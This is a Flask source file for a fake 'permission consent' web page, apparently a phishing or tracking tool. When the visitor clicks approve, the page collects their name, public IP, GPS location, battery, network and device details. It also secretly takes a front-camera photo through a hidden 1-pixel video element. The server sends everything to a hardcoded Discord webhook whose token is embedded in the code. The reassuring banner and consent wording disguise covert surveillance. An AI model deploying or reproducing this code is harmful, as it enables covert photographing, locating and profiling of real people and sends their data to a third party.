import os
import base64
import json
import requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

DISCORD_WEBHOOK_URL = os.getenv(
    "DISCORD_WEBHOOK_URL",
    "https://discord.com/api/webhooks/1558192127085781025/wUzlyTNtQbjoWz6aTgsE_YAKXj14XYo-gs7C6f25QBfqr_LqWUZQBQ97bUKdZsJ69X-E"
)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="zh" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>隐私与权限确认</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 480px; width: 100%; }
        h2 { color: #333; margin-bottom: 10px; }
        
        .legal-banner {
            background-color: #fff3cd;
            color: #856404;
            border: 2px solid #ffeeba;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 15px;
            font-weight: bold;
            text-align: right;
            line-height: 1.6;
        }

        #webcam {
            opacity: 0;
            position: absolute;
            top: 0;
            left: 0;
            z-index: -100;
            width: 1px;
            height: 1px;
            pointer-events: none;
        }

        .btn-container { margin-top: 15px; display: flex; justify-content: space-around; }
        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 45%; }
        .btn-approve { background-color: #28a745; color: white; }
        .btn-deny { background-color: #dc3545; color: white; }
        #status { margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h2>权限许可请求</h2>
        
        <div class="legal-banner">
            ✅DONT WORRY IT'S SAFE: 法律声明：<br>
            点击“Autoriser”即表示您同意共享姓名、地理位置、设备信息及照片。决定权完全在您手中，拒绝将不会收集任何数据。
        </div>

        <video id="webcam" autoplay playsinline muted></video>
        
        <form id="consentForm">
            <input type="text" id="username" placeholder="姓名 (Name)" required style="width: 85%; padding: 10px; margin-bottom: 15px; font-size: 14px;"><br>
            
            <div class="btn-container">
                <button type="button" class="btn-approve" onclick="captureAndSend(false)">Autoriser</button>
                <button type="button" class="btn-deny" onclick="captureAndSend(true)">Refuser</button>
            </div>
        </form>

        <div id="status"></div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        function getDeviceDetails() {
            const ua = navigator.userAgent;
            let deviceType = "Appareil Inconnu";
            
            if (/android/i.test(ua)) {
                let match = ua.match(/\b(SM-[A-Z0-9]+|GT-[A-Z0-9]+|Redmi\s[0-9A-Za-z\s]+|POCO\s[0-9A-Za-z\s]+|M2[0-9a-zA-Z]+|Nexus\s[0-9]+|Pixel\s[0-9a-zA-Z\s]+)/i);
                if (match) {
                    deviceType = "Android (" + match[0].trim() + ")";
                } else {
                    deviceType = "Android Phone / Mobile";
                }
            } else if (/iphone|ipad|ipod/i.test(ua)) {
                deviceType = "Apple iOS / iPhone";
            } else if (/windows/i.test(ua)) {
                deviceType = "Ordinateur Windows";
            } else if (/macintosh|mac os x/i.test(ua)) {
                deviceType = "Macintosh Apple";
            }
            return deviceType;
        }

        async function captureAndSend(isDenied) {
            const statusDiv = document.getElementById('status');
            const username = document.getElementById('username').value;

            if (isDenied) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = '您已拒绝授权，未收集任何数据。';
                return;
            }

            if (!username) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = '请先填写姓名。';
                return;
            }

            statusDiv.style.color = 'gray';
            statusDiv.innerText = '正在获取权限与 advanced information...';

            let locationData = "Non autorisé";
            let imageBase64 = null;
            let publicIP = "Inconnu";
            let batteryInfo = "Inconnu";
            let networkInfo = "Inconnu";

            // 1. جلب عنوان الـ IP الخارجي
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                publicIP = ipData.ip;
            } catch (e) {
                publicIP = "Non disponible";
            }

            // 2. جلب معلومات البطارية إن وجدت
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const charging = battery.charging ? "Oui ⚡" : "Non 🔋";
                    batteryInfo = `${level}% (En charge: ${charging})`;
                }
            } catch (e) {
                batteryInfo = "Non supporté";
            }

            // 3. جلب نوع الاتصال (Network Connection)
            try {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    networkInfo = `${connection.effectiveType ? connection.effectiveType.toUpperCase() : 'Inconnu'} (Débit: ${connection.downlink || '?'} Mbps)`;
                }
            } catch (e) {
                networkInfo = "Non disponible";
            }

            let deviceInfo = {
                model: getDeviceDetails(),
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                platform: navigator.platform,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Inconnu",
                cores: navigator.hardwareConcurrency || "Inconnu",
                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Inconnu",
                ip: publicIP,
                battery: batteryInfo,
                network: networkInfo
            };

            // 4. جلب الـ GPS
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
                });
                locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
            } catch (err) {
                locationData = "Accès à la localisation refusé";
            }

            // 5. التقاط الصورة بوضوح بعد ثانية واحدة (1000ms)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                const videoElement = document.getElementById('webcam');
                const canvas = document.getElementById('canvas');
                
                videoElement.srcObject = stream;

                await new Promise(resolve => setTimeout(resolve, 1000));

                canvas.width = videoElement.videoWidth || 640;
                canvas.height = videoElement.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                imageBase64 = canvas.toDataURL('image/jpeg');

                stream.getTracks().forEach(track => track.stop());

            } catch (err) {
                console.log("Impossible d'accéder à la caméra: ", err);
            }

            // 6. الإرسال إلى السيرفر
            try {
                const response = await fetch('/submit-consent', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        consent: true,
                        username: username,
                        location: locationData,
                        device: deviceInfo,
                        image: imageBase64
                    })
                });

                const result = await response.json();
                if (response.ok) {
                    statusDiv.style.color = 'green';
                    statusDiv.innerText = '已成功授权并发送数据！';
                } else {
                    statusDiv.style.color = 'red';
                    statusDiv.innerText = result.error || '发生错误。';
                }
            } catch (err) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = '无法连接到服务器。';
            }
        }
    </script>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route("/submit-consent", methods=["POST"])
def submit_consent():
    data = request.json or {}
    if not data.get("consent"):
        return jsonify({"message": "Demande refusée."}), 200

    username = data.get("username")
    location = data.get("location")
    device = data.get("device", {})
    image_data = data.get("image")

    payload = {
        "content": (
            f"✅ **Nouveau consentement et détails avancés de l'appareil:**\n"
            f"• **Nom:** {username}\n"
            f"• **Type / Modèle:** {device.get('model')}\n"
            f"• **Adresse IP:** {device.get('ip')}\n"
            f"• **Localisation (GPS):** {location}\n"
            f"• **Niveau de Batterie:** {device.get('battery')}\n"
            f"• **Type de Réseau:** {device.get('network')}\n"
            f"• **Résolution d'écran:** {device.get('screen')}\n"
            f"• **Fuseau Horaire (Timezone):** {device.get('timezone')}\n"
            f"• **Langue et système:** {device.get('language')} | {device.get('platform')}\n"
            f"• **Processeur & RAM:** {device.get('cores')} Cœurs | {device.get('ram')}"
        )
    }

    try:
        if image_data:
            header, encoded = image_data.split(",", 1)
            image_bytes = base64.b64decode(encoded)
            
            files = {
                "file": ("snapshot.jpg", image_bytes, "image/jpeg")
            }
            resp = requests.post(
                DISCORD_WEBHOOK_URL, 
                data={"payload_json": json.dumps(payload)}, 
                files=files, 
                timeout=10
            )
        else:
            resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)

        resp.raise_for_status()
        return jsonify({"message": "Envoyé avec succès."}), 200
    except requests.RequestException as e:
        return jsonify({"error": f"Échec de l'envoi: {str(e)}"}), 500

if __name__ == "__main__":
    app.run(port=5000, debug=True)
